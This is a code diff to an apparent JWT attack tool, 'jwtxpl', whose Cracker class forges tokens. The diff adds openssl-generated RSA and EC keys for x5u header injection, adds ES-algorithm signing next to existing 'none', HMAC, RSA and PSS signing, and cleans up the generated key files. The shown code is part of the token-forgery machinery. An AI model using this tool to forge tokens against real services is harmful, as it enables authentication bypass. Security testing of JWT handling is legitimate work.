@@ -146,7 +146,6 @@ class Cracker:
         self.cant_asymmetric_args = [self.auto_try, self.kid, self.exec_via_kid, self.specified_key]
         self.require_alg_args = [self.path_to_key] + self.cant_asymmetric_args + self.jwks_args
         """Store a command that need to run in case of x5u injection and open devnull"""
-        self.x5u_command = 'openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out testing.crt -subj "/C=US/State=Ohio/L=Columbus/O=TestingInc/CN=testing"'
         self.devnull = open(os.devnull, 'wb')
         """Call the validation"""
         self.validation()
@@ -243,8 +242,14 @@ class Cracker:
                 else:
                     """We have a key file to read from"""
                     if self.x5u_basic or self.x5u_header_injection:
-                        subprocess.run(self.x5u_command, shell=True, stdin=self.devnull, stderr=self.devnull, stdout=self.devnull)
-                        self.path_to_key = "key.pem"
+                        """Req a new cert and a new key file"""
+                        x5u_command = 'openssl req -newkey rsa:2048 -nodes -keyout rsa_jwtxpl_key.pem -x509 -days 365 -out jwtxpl_testing.crt -subj "/C=US/S=Ohio/L=Columbus/O=TestingInc/CN=testing"'
+                        try:
+                            subprocess.run(x5u_command, shell=True, stdin=self.devnull, stderr=self.devnull, stdout=self.devnull, check=True)
+                        except subprocess.CalledProcessError:
+                            print(f"{Bcolors.FAIL}jwtxpl: err: Error during cert request, please check your connection{Bcolors.FAIL}")
+                            sys.exit(7)
+                        self.path_to_key = "rsa_jwtxpl_key.pem"
                     """Read the key from the file"""
                     key_file = open(self.path_to_key, 'r')
                     key_read = key_file.read()
@@ -284,14 +289,25 @@ class Cracker:
                 else:
                     """We have a key file to read from"""
                     if self.x5u_basic or self.x5u_header_injection:
-                        #DEFINE OPENSSL COMMAND FOR CERT GEN WITH EC KEY
-                        pass
+                        if self.alg[-3:] == "256":
+                            curve = "secp256r1"
+                        elif self.alg[-3:] == "384":
+                            curve = "secp384r1"
+                        elif self.alg[-3:] == "512":
+                            curve = "secp521r1"
+                        x5u_command = f'openssl req -newkey ec -pkeyopt ec_paramgen_curve:{curve} -nodes -keyout ec_jwtxpl_key.pem -x509 -days 365 -out jwtxpl_testing.crt'
+                        try:
+                            subprocess.run(x5u_command, shell=True, stdin=self.devnull, stderr=self.devnull, stdout=self.devnull, check=True)
+                        except subprocess.CalledProcessError:
+                            print(f"{Bcolors.FAIL}jwtxpl: err: Error during cert request, please check your connection{Bcolors.ENDC}")
+                            sys.exit(7)
+                        self.path_to_key = "ec_jwtxpl_key.pem"
                     with open(self.path_to_key, 'rb') as keyfile:
                         self.key = load_pem_private_key(keyfile.read(), password=None)
-                    "Extract the public key and public numbers"
-                    self.key.pub = self.key.public_key()
-                    self.key.pub.x = self.key.public_numbers().x
-                    self.key.pub.y = self.key.public_numbers().y
+                "Extract the public key and public numbers"
+                self.key.pub = self.key.public_key()
+                self.key.pub.x = self.key.public_numbers().x
+                self.key.pub.y = self.key.public_numbers().y
             elif self.alg[:2] == "HS":
                 """Check for key conflicts"""
                 if any(self.jwks_args):
@@ -739,21 +755,26 @@ class Cracker:
             try:
                 if self.alg == "None" or self.alg == "none":
                     signature = ""
-                elif self.alg.startswith("HS"):
+                elif self.alg[:2] == "HS":
                     if self.key is None:
                         print(f"{Bcolors.FAIL}jwtxpl: err: Key is needed with HS*{Bcolors.ENDC}")
                         sys.exit(4)
                     signature = Cracker.sign_token_with_hmac(self.key, partial_token, sign_hash)
-                elif self.alg.startswith("RS"):
+                elif self.alg[:2] == "RS":
                     if self.key is None:
                         print(f"{Bcolors.FAIL}jwtxpl: err: Key is needed with RS*{Bcolors.ENDC}")
                         sys.exit(4)
                     signature = Cracker.sign_token_with_rsa_pkcs1(self.key.priv, partial_token, sign_hash)
-                elif self.alg.startswith("PS"):
+                elif self.alg[:2] == "PS":
                     if self.key is None:
                         print(f"{Bcolors.FAIL}jwtxpl: err: Key is needed with PS*{Bcolors.ENDC}")
                         sys.exit(4)
                     signature = Cracker.sign_token_with_rsa_pss(self.key.priv, partial_token, sign_hash)
+                elif self.alg[:2] == "ES":
+                    if self.key is None:
+                        print(f"{Bcolors.FAIL}jwtxpl: err: Key is needed with ES*{Bcolors.ENDC}")
+                        sys.exit(4)
+                    signature = Cracker.sign_token_with_ec(self.key, partial_token, sign_hash)
             except (TypeError, AttributeError):
                 print(f"{Bcolors.FAIL}jwtxpl: err: Key mismatch: The key you passed is not compatible with {self.alg}{Bcolors.ENDC}")
                 sys.exit(2)
@@ -1359,12 +1380,16 @@ class Cracker:
         print(f"{Bcolors.BOLD}{Bcolors.HEADER}Final Token:{Bcolors.ENDC} {Bcolors.BOLD}{Bcolors.OKBLUE}{final_token}{Bcolors.ENDC}")
         if self.file is not None:
             self.file.close()
+        if os.path.exists("rsa_jwtxpl_key.pem"):
+            os.remove("rsa_jwtxpl_key.pem")
+        if os.path.exists("ec_jwtxpl_key.pem"):
+            os.remove("ec_jwtxpl_key.pem")
         if os.path.exists("key.pem"):
             os.remove("key.pem")
         if os.path.exists("cert.pem"):
             os.remove("cert.pem")
-        if os.path.exists("testing.crt"):
-            os.remove("testing.crt")
+        if os.path.exists("jwtxpl_testing.crt"):
+            os.remove("jwtxpl_testing.crt")
         self.devnull.close()
         sys.exit(0)
 
